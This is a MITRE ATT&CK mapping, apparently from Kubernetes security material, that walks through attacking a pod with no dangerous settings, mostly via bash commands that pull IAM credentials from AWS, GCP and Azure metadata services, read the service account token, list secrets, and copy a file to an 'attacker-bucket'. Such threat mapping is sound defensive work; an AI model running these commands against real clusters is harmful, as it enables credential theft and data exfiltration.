# MITRE ATT&CK Mapping: Nothing-Allowed Pod

## Attack Flow

```
Initial Access → Execution → Discovery → Credential Access → Privilege Escalation
```

---

## MITRE ATT&CK Techniques

### 1. Initial Access

#### T1078 - Valid Accounts
**Behavior:** Attacker uses compromised Kubernetes credentials

**Procedures:**
```bash
kubectl apply -f nothing-allowed-exec-pod.yaml
```

---

### 2. Execution

#### T1609 - Container Administration Command
**Behavior:** Execute commands in container via kubectl exec

**Procedures:**
```bash
kubectl exec -it nothing-allowed-exec-pod -- bash
```

#### T1059.004 - Command and Scripting Interpreter: Unix Shell
**Behavior:** Execute bash commands to access cloud metadata and services

**Procedures:**
```bash
curl http://169.254.169.254/latest/meta-data
curl -H "Metadata-Flavor: Google" http://metadata/computeMetadata/v1/instance/
```

---

### 3. Discovery

#### T1580 - Cloud Infrastructure Discovery
**Behavior:** Query cloud metadata service to discover instance information

**AWS:**
```bash
curl http://169.254.169.254/latest/meta-data
curl http://169.254.169.254/latest/user-data

# IMDSv2
TOKEN="$(curl -X PUT -H "X-aws-ec2-metadata-token-ttl-seconds: 600" http://169.254.169.254/latest/api/token)"
curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data
```

**GCP:**
```bash
curl -H "Metadata-Flavor: Google" http://metadata/computeMetadata/v1/instance/
curl -H "Metadata-Flavor:Google" http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/
```

**Azure:**
```bash
curl -H Metadata:true "http://169.254.169.254/metadata/instance?api-version=2020-10-01"
```

#### T1613 - Container and Resource Discovery
**Behavior:** Enumerate Kubernetes service account permissions

**Procedures:**
```bash
kubectl auth can-i --list
kubectl get pods
kubectl get secrets
```

---

### 4. Credential Access

#### T1552.005 - Unsecured Credentials: Cloud Instance Metadata API
**Behavior:** Access cloud IAM credentials from metadata service

**AWS:**
```bash
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/[ROLE_NAME]
```

**GCP:**
```bash
curl -H "Metadata-Flavor:Google" http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
```

**Azure:**
```bash
curl -H Metadata:true "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
```

#### T1528 - Steal Application Access Token
**Behavior:** Access Kubernetes service account token

**Procedures:**
```bash
cat /var/run/secrets/kubernetes.io/serviceaccount/token
kubectl --token=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token) auth can-i --list
```

---

### 5. Privilege Escalation

#### T1078.004 - Valid Accounts: Cloud Accounts
**Behavior:** Use stolen cloud IAM credentials for escalation

**AWS:**
```bash
aws sts get-caller-identity
aws eks describe-cluster --name clusterName
aws s3 ls
aws iam list-roles
```

**GCP:**
```bash
gsutil ls
gsutil cat gs://bucket/sensitive-file.txt
gcloud projects list
```

**Azure:**
```bash
az login -i
az storage account list
az aks list
az role assignment list
```

#### T1068 - Exploitation for Privilege Escalation
**Behavior:** Exploit Kubernetes or kernel vulnerabilities

**Procedures:**
```bash
# Example: CVE-2020-8558 - Kubernetes kubelet bypass
# Exploit unpatched vulnerabilities
```

---

### 6. Lateral Movement

#### T1021.007 - Remote Services: Cloud Services
**Behavior:** Use stolen credentials to access cloud resources

**Procedures:**
```bash
# AWS
aws s3 cp sensitive-file.txt s3://attacker-bucket/

# GCP
gsutil cp gs://victim-bucket/secrets.txt .

# Azure
az storage blob download --container-name secrets
```

---

## Technique Summary

| Tactic | Technique ID | Technique Name |
|--------|-------------|----------------|
| Initial Access | T1078 | Valid Accounts |
| Execution | T1609 | Container Administration Command |
| Execution | T1059.004 | Unix Shell |
| Discovery | T1580 | Cloud Infrastructure Discovery |
| Discovery | T1613 | Container and Resource Discovery |
| Credential Access | T1552.005 | Cloud Instance Metadata API |
| Credential Access | T1528 | Steal Application Access Token |
| Privilege Escalation | T1078.004 | Cloud Accounts |
| Privilege Escalation | T1068 | Exploitation for Privilege Escalation |
| Lateral Movement | T1021.007 | Cloud Services |

**Total: 10 Techniques across 6 Tactics**

**Pod Configuration:**
```yaml
spec:
  containers:
  - name: nothing-allowed-pod
    image: ubuntu
    # No dangerous attributes
```

**Key Features:**
- No privileged, hostPath, hostPID, hostNetwork, or hostIPC
- Primary attack: Cloud metadata service (AWS/GCP/Azure IMDS)
- Secondary: Overly permissive service account
- Tertiary: Anonymous-auth enabled on kubelet/apiserver
- Last resort: Kernel/K8s exploits, vulnerable services
